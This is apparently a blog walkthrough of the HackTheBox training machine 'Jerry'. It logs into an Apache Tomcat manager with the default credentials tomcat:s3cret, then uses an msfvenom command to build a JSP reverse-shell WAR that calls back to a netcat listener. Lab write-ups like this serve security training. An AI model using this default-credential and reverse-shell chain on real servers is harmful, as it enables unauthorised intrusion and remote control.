Hello everyone, In this blog we are going to solve Jerry from HackTheBox.

Link for the machine : [https://app.hackthebox.com/machines/Jerry](https://app.hackthebox.com/machines/Jerry)

  

Lets Start ðŸ™Œ

  

Connect to the HTB server by using the OpenVpn configuration file thatâ€™s generated by HTB.

[ [Click Here](https://help.hackthebox.com/en/articles/5185687-introduction-to-lab-access) to learn more about how to connect to vpn and access the boxes. ]

After connecting to the vpn service, click on Join Machine to access the machineâ€™s ip.

After joining the machine you can see the IP Address of the target machine.

  

First start the reconnaissance by running `rustscan` on the target IP address.

Command: `rustscan -a 10.10.10.95 -- -A -T4 -v -Pn`

From the results of `rustscan`, we can see that on port `8080`, Apache Tomcat service is running.

I visited the web server running on `http://10.10.10.95:8080/`.

![Untitled 2.png](Jerry/assets/Untitled%202.png)

We can see the default home page of the Apache Tomcat server. I started exploring by clicking all the buttons and links in the home page.

![Untitled 3.png](Jerry/assets/Untitled%203.png)

I clicked the Manager App button and it redirected me to the following link: [http://10.10.10.95:8080/manager/html](http://10.10.10.95:8080/manager/html), which prompted me for a username and password:

![Untitled 4.png](Jerry/assets/Untitled%204.png)

On investigating about the above URL, I found this [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#default-credentials](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#default-credentials)

![Untitled 5.png](Jerry/assets/Untitled%205.png)

So I tried `admin:admin` combination in the prompt and it thrown me the following error:

![Untitled 6.png](Jerry/assets/Untitled%206.png)

from the above error, we can see that they have shown a example, in which they have used `tomcat:s3cret` combination. Letâ€™s give it a try with this combination.

![Untitled 7.png](Jerry/assets/Untitled%207.png)

It worked and we got access to the Application Manager.

Further surfing the Application Manager, we can see that there is an option to upload files of type WAR.

![Untitled 8.png](Jerry/assets/Untitled%208.png)

We can generate a `msfvenom` reverse shell and upload it as mentioned here: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#msfvenom-reverse-shell](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#msfvenom-reverse-shell)

![Untitled 9.png](Jerry/assets/Untitled%209.png)

Generate the Reverse Shell using the following command:

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<HTB_tun_IP> LPORT=8888 -f war -o revshell.war`

![Untitled 10.png](Jerry/assets/Untitled%2010.png)

Now upload this `revshell.war` file and click deploy.

![Untitled 11.png](Jerry/assets/Untitled%2011.png)

Now if we check the Applications table, we can see that a new path `/revshell` is generated.

![Untitled 12.png](Jerry/assets/Untitled%2012.png)

Before clicking or viewing the `/revshell` link, start a `netcat` listener on your attack box / local machine on port `8888`

![Untitled 13.png](Jerry/assets/Untitled%2013.png)

Now click the `/revshell` and check the `netcat` listener.

![Untitled 14.png](Jerry/assets/Untitled%2014.png)

![Untitled 15.png](Jerry/assets/Untitled%2015.png)

We have successfully got access to the target machine.

Now we have to look out for the flags. I started surfing the machine. I visited the `C:\Users` directory and found the following users:

![Untitled 16.png](Jerry/assets/Untitled%2016.png)

I checked the Administrator directory. In the Desktop folder of Administrator found the `flags` directory.

![Untitled 17.png](Jerry/assets/Untitled%2017.png)

The flags directory had a file named `2 for the price of 1.txt`.

You can view the contents of the `2 for the price of 1.txt` file using the command: `more "2 for the price of 1.txt"`

![Untitled 18.png](Jerry/assets/Untitled%2018.png)

We have successfully found both the user and root flags.

  

Thank You !!!!!!!
